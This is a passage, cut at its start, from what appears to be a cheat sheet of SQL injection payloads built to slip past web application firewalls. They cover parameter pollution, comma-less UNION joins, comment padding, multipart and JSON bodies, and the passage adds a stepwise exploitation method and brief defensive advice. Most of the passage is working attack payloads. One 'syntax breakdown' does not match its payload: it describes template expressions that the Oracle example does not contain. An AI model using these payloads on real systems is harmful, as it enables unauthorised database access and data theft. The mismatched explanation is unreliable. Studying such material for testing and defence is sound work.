?id=1&id=UNION&id=SELECT&id=1,2,3--
```
**Syntax breakdown:**
- `UNION` — merge query result sets _keyword_
- `SELECT` — query data _keyword_
- `--` — SQL comment _operator_

**Equivalent function substitution**
> Use GREATEST to replace the > symbol
```
' AND GREATEST(1,0)--
```
**Syntax breakdown:**
- `--` — SQL comment _operator_

**Comma-less injection**
> Perform a union query without using commas
```
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
```
**Syntax breakdown:**
- `UNION` — merge query results _keyword_
- `SELECT...FROM` — query data _keyword_
- `--` — SQL comment _operator_

**IBM/Oracle-specific**
> Use specific database features to bypass generic rules
```
' UNION SELECT CAST(1 AS VARCHAR(10)) FROM dual--
```
**Syntax breakdown:**
- `{{}}` — template expression _technique_
- `__class__` — class attribute _keyword_

**Junk data padding**
> Overflow the WAF buffer with an overlong data string (illustrative code)
```
/* !50000AAAAAAAAAA...(1000+ bytes of junk data)...*/ UNION SELECT 1,2,3--
```
**Syntax breakdown:**
- `UNION` — merge query result sets _keyword_
- `SELECT` — query data _keyword_
- `--` — SQL comment _operator_

**Content-Type spoofing**
> Use multipart to bypass detection
```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="id"

1 UNION SELECT 1,2,3--
------WebKitFormBoundary--
```
**Syntax breakdown:**
- `UNION` — merge query results _keyword_
- `SELECT` — query data _keyword_
- `--` — SQL comment _operator_
- `Content-Type` — content type header _header_

**JSON injection**
> Inject in JSON data
```
{"id": "1' UNION SELECT 1,2,3--"}
```
**Syntax breakdown:**
- `id:` — command/keyword _command_

**Overview:** SQL injection WAF bypass techniques are advanced injection methods targeting Web Application Firewall protection, evading the WAF's rule-matching engine via encoding obfuscation, chunked transfer, inline comments, case transformation, equivalent function substitution, and so on, still achieving database information extraction and privilege acquisition in an environment with WAF protection.

**Vulnerability Principle:** A WAF usually uses regex matching and keyword detection to block SQL injection, but its rule library cannot cover all encoding variants and syntax transformations. An attacker uses the differences between the database engine and the WAF parser to construct malicious statements that the WAF cannot recognize but the database can execute normally.

**Exploitation Method:** First identify the WAF type and version (via response headers, block page characteristics), then progressively test various bypass techniques: double URL encoding, Unicode encoding, inline comments splitting keywords (such as /*!50000SELECT*/), equivalent function substitution (such as MID replacing SUBSTR), HTTP parameter pollution, chunked transfer encoding, and so on; after finding a bypassing payload, extract data.

**Defensive Measures:** Deploy parameterized queries to fundamentally eliminate SQL injection, with the WAF only as a defense-in-depth layer; regularly update the WAF rule library; enable the WAF's deep decoding feature (recursive URL decoding, Unicode decoding); enforce rate limiting and behavioral analysis on abnormal requests; combine RASP technology to detect SQL injection behavior at runtime.

---
